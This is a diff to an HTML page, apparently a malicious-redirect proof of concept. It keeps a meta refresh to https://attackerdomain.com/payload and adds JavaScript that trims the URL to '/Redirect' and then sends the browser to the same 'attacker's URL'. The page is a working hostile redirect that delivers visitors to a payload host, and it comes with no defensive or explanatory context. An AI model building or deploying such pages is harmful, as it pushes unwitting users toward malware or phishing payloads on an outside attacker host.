@@ -2,9 +2,29 @@
 <head>
     <meta http-equiv="refresh" content="0;url=https://attackerdomain.com/payload">
     <script type="text/javascript">
-        setTimeout(function() {
-            window.location.href = "attackerdomain.com/payload";
-        }, 0);
+        // Function to clean the URL by stripping out everything after "/Redirect"
+        function cleanAndRedirect() {
+            var currentURL = window.location.href;
+            
+            // Check if there is anything after "/Redirect"
+            if (currentURL.indexOf('/Redirect') !== -1) {
+                var cleanURL = currentURL.split('/Redirect')[0] + '/Redirect'; // Strip everything after "/Redirect"
+                
+                // If the URL is different, redirect to the cleaned version
+                if (currentURL !== cleanURL) {
+                    window.location.replace(cleanURL); // Redirect to cleaned URL
+                    return;
+                }
+            }
+            
+            // If there is no need to clean, proceed with the redirect to the attacker's URL
+            setTimeout(function() {
+                window.location.href = "https://attackerdomain.com/payload";
+            }, 0);
+        }
+        
+        // Call the function to clean and redirect
+        cleanAndRedirect();
     </script>
 </head>
 <body>
